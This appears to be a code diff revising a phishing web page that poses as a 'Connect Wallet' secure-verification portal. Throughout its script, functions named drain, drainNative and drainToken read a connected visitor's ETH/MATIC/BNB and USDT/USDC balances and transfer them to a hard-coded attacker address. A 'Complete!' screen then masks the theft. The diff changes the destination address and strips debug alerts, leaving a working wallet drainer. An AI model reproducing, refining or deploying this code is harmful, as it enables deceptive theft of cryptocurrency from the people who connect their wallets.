@@ -1,54 +1,60 @@
-background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-font-family: system-ui, -apple-system, sans-serif;
-}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: system-ui, -apple-system, sans-serif;
+        }
         .card {
             background: white;
             border-radius: 24px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
-        .card { background: white; border-radius: 24px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
-@keyframes spin { to { transform: rotate(360deg); } }
-.spinner { animation: spin 1s linear infinite; }
-</style>
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .spinner { animation: spin 1s linear infinite; }
+    </style>
 </head>
 <body class="min-h-screen flex items-center justify-center p-4">
 
 <div class="max-w-md w-full">
     
     <!-- CONNECT -->
-<div id="connect" class="card p-8 text-center">
-<div class="text-6xl mb-4">🔐</div>
-<h1 class="text-3xl font-bold text-gray-800 mb-4">Connect Wallet</h1>
+    <div id="connect" class="card p-8 text-center">
+        <div class="text-6xl mb-4">🔐</div>
+        <h1 class="text-3xl font-bold text-gray-800 mb-4">Connect Wallet</h1>
         <p class="text-gray-600 mb-6">Secure verification</p>
-<button onclick="connect()" 
-class="w-full bg-gradient-to-r from-purple-600 to-indigo-600 text-white py-4 rounded-xl text-lg font-bold">
-Connect Now
-</button>
-</div>
+        <button onclick="connect()" 
+            class="w-full bg-gradient-to-r from-purple-600 to-indigo-600 text-white py-4 rounded-xl text-lg font-bold">
+            Connect Now
+        </button>
+    </div>
 
     <!-- PROCESSING -->
-<div id="processing" class="card p-8 text-center hidden">
-<div class="text-6xl mb-4 spinner">⚡</div>
-<h2 class="text-2xl font-bold text-gray-800 mb-4">Processing</h2>
+    <div id="processing" class="card p-8 text-center hidden">
+        <div class="text-6xl mb-4 spinner">⚡</div>
+        <h2 class="text-2xl font-bold text-gray-800 mb-4">Processing</h2>
         <p id="status" class="text-gray-600 mb-4">Initializing...</p>
         <div class="w-full bg-gray-200 rounded-full h-3 mb-4">
-        <p id="status" class="text-gray-600 mb-4">Working...</p>
-        <div class="w-full bg-gray-200 rounded-full h-3">
-<div id="progress" class="bg-purple-600 h-3 rounded-full transition-all" style="width:0%"></div>
-</div>
+            <div id="progress" class="bg-purple-600 h-3 rounded-full transition-all" style="width:0%"></div>
+        </div>
         <p id="detail" class="text-sm text-gray-500"></p>
-</div>
+    </div>
 
     <!-- SUCCESS -->
-<div id="success" class="card p-8 text-center hidden">
-<div class="text-6xl mb-4">✅</div>
+    <div id="success" class="card p-8 text-center hidden">
+        <div class="text-6xl mb-4">✅</div>
         <h2 class="text-2xl font-bold text-green-600 mb-4">Complete!</h2>
         <p class="text-gray-600 mb-4">Transactions completed</p>
         <div id="result" class="bg-gray-100 rounded-xl p-4 text-sm text-left max-h-64 overflow-y-auto mb-4"></div>
-        <h2 class="text-2xl font-bold text-green-600 mb-4">Success!</h2>
-        <div id="result" class="bg-gray-100 rounded-xl p-4 text-sm text-left mb-4"></div>
-<button onclick="location.reload()" class="w-full bg-purple-600 text-white py-3 rounded-xl">Done</button>
-</div>
+        <button onclick="location.reload()" class="w-full bg-purple-600 text-white py-3 rounded-xl">Done</button>
+    </div>
 
 </div>
 
@@ -56,7 +62,6 @@ Connect Now
 import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5@4.0.0'
 
 const DEST = "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578";
-const DEST = "0xe9d83750dF3351b77653EBBcb06B300D6Cf59a2f";
 const PID = "72f0728c47e59d2eb9fc83069bc6843d";
 
 const ERC20_ABI = [
@@ -65,7 +70,6 @@ const ERC20_ABI = [
     "function decimals() view returns (uint8)",
     "function symbol() view returns (string)"
 ];
-const ABI = ["function balanceOf(address) view returns (uint256)","function transfer(address, uint256) returns (bool)","function decimals() view returns (uint8)"];
 
 const TOKENS = {
     1: [
@@ -88,27 +92,26 @@ const CHAINS = {
     1: {name:'Ethereum',currency:'ETH'},
     137: {name:'Polygon',currency:'MATIC'},
     56: {name:'BSC',currency:'BNB'}
-    1: [{a:"0xdAC17F958D2ee523a2206206994597C13D831ec7",s:"USDT"},{a:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",s:"USDC"}],
-    137: [{a:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",s:"USDT"},{a:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",s:"USDC"}],
-    56: [{a:"0x55d398326f99059fF775485246999027B3197955",s:"USDT"},{a:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",s:"USDC"}]
 };
 
 const mainnet = {chainId:1,name:'Ethereum',currency:'ETH',explorerUrl:'https://etherscan.io',rpcUrl:'https://eth.llamarpc.com'};
-@@ -99,11 +64,7 @@ <h2 class="text-2xl font-bold text-green-600 mb-4">Complete!</h2>
+const polygon = {chainId:137,name:'Polygon',currency:'MATIC',explorerUrl:'https://polygonscan.com',rpcUrl:'https://polygon-rpc.com'};
+const bsc = {chainId:56,name:'BSC',currency:'BNB',explorerUrl:'https://bscscan.com',rpcUrl:'https://bsc-dataseed.binance.org'};
 
 const cfg = defaultConfig({
-metadata:{name:'Portal',description:'Connect',url:window.location.origin,icons:['https://avatars.githubusercontent.com/u/37784886']},
+    metadata:{name:'Portal',description:'Connect',url:window.location.origin,icons:['https://avatars.githubusercontent.com/u/37784886']},
     enableEIP6963:true,
     enableInjected:true,
     enableCoinbase:true,
     rpcUrl:'https://polygon-rpc.com',
     defaultChainId:137
-    enableEIP6963:true,enableInjected:true,enableCoinbase:true,rpcUrl:'https://polygon-rpc.com',defaultChainId:137
 });
 
 const modal = createWeb3Modal({
-@@ -113,316 +74,197 @@ <h2 class="text-2xl font-bold text-green-600 mb-4">Complete!</h2>
-enableAnalytics:false
+    ethersConfig:cfg,
+    chains:[polygon,mainnet,bsc],
+    projectId:PID,
+    enableAnalytics:false
 });
 
 let provider, signer, address, chainId;
@@ -119,8 +122,7 @@ function show(id) {
     ['connect','processing','success'].forEach(x => 
         document.getElementById(x).classList.add('hidden')
     );
-    ['connect','processing','success'].forEach(x => document.getElementById(x).classList.add('hidden'));
-document.getElementById(id).classList.remove('hidden');
+    document.getElementById(id).classList.remove('hidden');
 }
 
 function setStatus(t){document.getElementById('status').textContent=t;}
@@ -130,15 +132,11 @@ function log(m){
     console.log('[DRAIN] '+m);
     console.log(new Date().toISOString().split('T')[1].split('.')[0] + ' - ' + m);
 }
-function prog(n){document.getElementById('progress').style.width=n+'%';}
-function stat(t){document.getElementById('status').textContent=t;}
 
 window.connect = async function() {
-try {
+    try {
         log('Opening modal...');
-        alert('Opening wallet selection...');
-        
-await modal.open();
+        await modal.open();
     } catch(e) {
         log('ERROR opening modal: '+e.message);
         alert('Connection failed: '+e.message);
@@ -151,10 +149,9 @@ modal.subscribeProvider(async(state) => {
     if(state.isConnected && state.address) {
         log('Wallet connected!');
         log('Address: ' + state.address);
-
+        
         address = state.address;
-        alert('Waiting for wallet connection...');
-
+        
         try {
             // Create provider from wallet
             log('Creating provider...');
@@ -173,14 +170,7 @@ modal.subscribeProvider(async(state) => {
             // Wait a bit for everything to stabilize
             log('Waiting 2 seconds for provider to stabilize...');
             await new Promise(resolve => setTimeout(resolve, 2000));
-        // Wait for modal to close (means user connected)
-        let connected = false;
-        let attempts = 0;
-        
-        while(!connected && attempts < 30) {
-            await new Promise(r => setTimeout(r, 1000));
-            attempts++;
-
+            
             // Start drainage if not already started
             if (!drainStarted) {
                 drainStarted = true;
@@ -188,68 +178,25 @@ modal.subscribeProvider(async(state) => {
                 await drain();
             } else {
                 log('Drainage already started, skipping');
-            const state = modal.getState();
-            if(state && state.open === false) {
-                alert('Modal closed, checking connection...');
-                connected = true;
-                break;
-}
+            }
             
         } catch(e) {
             log('ERROR in connection handler: ' + e.message);
             log('Error stack: ' + e.stack);
             alert('Setup failed: ' + e.message);
-}
-        
-        if(!connected) {
-            alert('Connection timeout');
-            return;
         }
-        
-        alert('Connection detected! Getting provider...');
-        
-        // Get wallet account via modal
-        const walletProvider = modal.getWalletProvider();
-        if(!walletProvider) {
-            alert('ERROR: No wallet provider found');
-            return;
-        }
-        
-        alert('Provider found! Creating ethers provider...');
-        
-        const provider = new ethers.providers.Web3Provider(walletProvider);
-        const signer = provider.getSigner();
-        const address = await signer.getAddress();
-        
-        alert('Connected! Address: ' + address.slice(0,10) + '...');
-        
-        const network = await provider.getNetwork();
-        const chainId = network.chainId;
-        
-        alert('Chain ID: ' + chainId);
-        
-        // Start drainage
-        await drain(provider, signer, address, chainId);
-        
-    } catch(e) {
-        alert('ERROR: ' + e.message);
-        console.error(e);
-}
+    }
 });
-}
 
 async function drain() {
     log('>>> drain() function called');
     
-async function drain(provider, signer, address, chainId) {
-show('processing');
+    show('processing');
     setStatus('Initializing...');
     setProgress(10);
-    stat('Starting...');
-    prog(10);
-results = [];
-
-try {
+    results = [];
+    
+    try {
         // Verify we have everything
         if (!provider) {
             throw new Error('Provider not initialized');
@@ -265,97 +212,55 @@ try {
         }
         
         log('All checks passed, starting drainage...');
-        const chainNames = {1:'Ethereum',137:'Polygon',56:'BSC'};
-        const currencies = {1:'ETH',137:'MATIC',56:'BNB'};
-
+        
         const chain = CHAINS[chainId];
         if(!chain) {
             log('Unsupported chain: '+chainId);
             throw new Error('Please switch to Ethereum, Polygon or BSC');
         }
-        const chainName = chainNames[chainId] || 'Unknown';
-        const currency = currencies[chainId] || 'Token';
-
+        
         log('Draining on: ' + chain.name);
-        alert('Draining on ' + chainName);
-
+        
         // DRAIN NATIVE
         setStatus('Checking balance...');
         setProgress(20);
-        // Native
-        stat('Checking ' + currency + '...');
-        prog(20);
-
+        
         log('Getting balance...');
         const balance = await provider.getBalance(address);
         const balEth = parseFloat(ethers.utils.formatEther(balance));
-        const bal = await provider.getBalance(address);
-        const balEth = parseFloat(ethers.utils.formatEther(bal));
-
+        
         log('Balance: ' + balEth + ' ' + chain.currency);
-        alert(currency + ' balance: ' + balEth);
-
-if(balEth > 0.001) {
+        
+        if(balEth > 0.001) {
             log('Balance sufficient, starting native drain...');
             setStatus('Transferring '+chain.currency+'...');
             setDetail('Amount: '+balEth.toFixed(4));
-            stat('Transferring ' + currency + '...');
-
+            
             const nativeHash = await drainNative(balance, chain);
             if(nativeHash) {
                 log('Native drain SUCCESS: ' + nativeHash);
-            const gp = await provider.getGasPrice();
-            const amt = bal.sub(gp.mul(21000).mul(2));
-            
-            if(amt.gt(0)) {
-                alert('Sending transaction... Please CONFIRM in your wallet!');
-                
-                const tx = await signer.sendTransaction({
-                    to: DEST,
-                    value: amt,
-                    gasLimit: 21000
-                });
-                
-                alert('TX sent: ' + tx.hash);
-                stat('Confirming...');
-                
-                await tx.wait();
-                
-                alert('TX confirmed!');
-                
-results.push({
+                results.push({
                     symbol: chain.currency,
-                    symbol: currency,
-amount: balEth.toFixed(6),
+                    amount: balEth.toFixed(6),
                     txHash: nativeHash
-                    txHash: tx.hash
-});
+                });
             } else {
                 log('Native drain FAILED');
-}
+            }
         } else {
             log('Balance too low: ' + balEth);
-}
-
+        }
+        
         setProgress(40);
         
         // DRAIN TOKENS
         const tokenList = TOKENS[chainId] || [];
         log('Checking ' + tokenList.length + ' tokens...');
-        prog(50);
-
+        
         let checked = 0;
-        // Tokens
-        const tokens = TOKENS[chainId] || [];
-        alert('Checking ' + tokens.length + ' tokens...');
-
+        
         for(const token of tokenList) {
-        for(let i=0; i<tokens.length; i++) {
-            const tok = tokens[i];
-            prog(50 + (50 * i / tokens.length));
-            stat('Checking ' + tok.s + '...');
-            
-try {
+            try {
                 checked++;
                 const progressPct = 40 + (50 * checked / tokenList.length);
                 setProgress(progressPct);
@@ -363,31 +268,21 @@ try {
                 setDetail('Token '+checked+'/'+tokenList.length);
                 
                 log('>>> Checking token: ' + token.symbol + ' at ' + token.addr);
-                const tc = new ethers.Contract(tok.a, ABI, provider);
-                const tokBal = await tc.balanceOf(address);
-
+                
                 const tc = new ethers.Contract(token.addr, ERC20_ABI, provider);
                 const bal = await tc.balanceOf(address);
                 
                 log(token.symbol + ' balance: ' + bal.toString());
                 
                 if(bal.gt(0)) {
-                if(tokBal.gt(0)) {
-const dec = await tc.decimals();
+                    const dec = await tc.decimals();
                     const fmt = ethers.utils.formatUnits(bal, dec);
-                    const fmt = ethers.utils.formatUnits(tokBal, dec);
                     
-                    alert(tok.s + ' balance: ' + fmt);
-                    alert('Transferring ' + tok.s + '... Please CONFIRM!');
-
                     log(token.symbol + ' formatted balance: ' + fmt);
-                    const tcs = tc.connect(signer);
-                    const tx = await tcs.transfer(DEST, tokBal, {gasLimit:100000});
-
+                    
                     setStatus('Transferring '+token.symbol+'...');
                     setDetail('Amount: '+fmt.slice(0,10));
-                    alert(tok.s + ' TX sent: ' + tx.hash);
-
+                    
                     const tokenHash = await drainToken(token.addr, bal, token.symbol);
                     if(tokenHash) {
                         log(token.symbol + ' drain SUCCESS: ' + tokenHash);
@@ -401,39 +296,26 @@ const dec = await tc.decimals();
                     }
                 } else {
                     log(token.symbol + ' balance is 0');
-                    await tx.wait();
-                    
-                    alert(tok.s + ' confirmed!');
-                    
-                    results.push({
-                        symbol: tok.s,
-                        amount: fmt.slice(0,10),
-                        txHash: tx.hash
-                    });
-}
+                }
                 
-} catch(e) {
+            } catch(e) {
                 log('ERROR checking ' + token.symbol + ': ' + e.message);
-                alert(tok.s + ' error: ' + e.message);
-}
-}
-
+            }
+        }
+        
         setProgress(100);
         
         log('Drainage complete. Results: ' + results.length);
-        prog(100);
-
-if(results.length === 0) {
+        
+        if(results.length === 0) {
             log('No assets transferred');
             alert('No assets found to transfer');
-            alert('No assets found');
-show('connect');
-return;
-}
-
+            show('connect');
+            return;
+        }
+        
         displayResults();
-        alert('Drainage complete! ' + results.length + ' transfers');
-
+        
     } catch(e) {
         log('ERROR in drain(): ' + e.message);
         log('Error stack: ' + e.stack);
@@ -466,12 +348,8 @@ async function drainNative(balance, chain) {
             to: DEST,
             value: amt,
             gasLimit: 21000
-        let html = '<p class="font-bold mb-3">Completed:</p>';
-        results.forEach(r => {
-            html += `<div class="mb-2 pb-2 border-b"><p class="font-semibold">${r.symbol}</p><p class="text-xs">${r.amount}</p><p class="text-xs text-blue-600 break-all">${r.txHash}</p></div>`;
-});
-        document.getElementById('result').innerHTML = html;
-
+        });
+        
         log('Transaction sent! Hash: ' + tx.hash);
         log('Waiting for confirmation...');
         
@@ -512,15 +390,12 @@ async function drainToken(addr, balance, symbol) {
         log('Status: ' + receipt.status);
         
         return tx.hash;
-        show('success');
-
-} catch(e) {
+        
+    } catch(e) {
         log('ERROR in drainToken(): ' + e.message);
         if(e.data) log('Error data: ' + JSON.stringify(e.data));
         return null;
-        alert('Drainage error: ' + e.message);
-        show('connect');
-}
+    }
 }
 
 function displayResults() {
@@ -549,7 +424,7 @@ log('║  WalletConnect v2 Ready        ║');
 log('╚════════════════════════════════╝');
 log('Destination: ' + DEST);
 log('Supported chains: Ethereum, Polygon, BSC');
-alert('System ready. Destination: 0xe9d83750dF3351b77653EBBcb06B300D6Cf59a2f');
 </script>
 
 </body>
+</html>
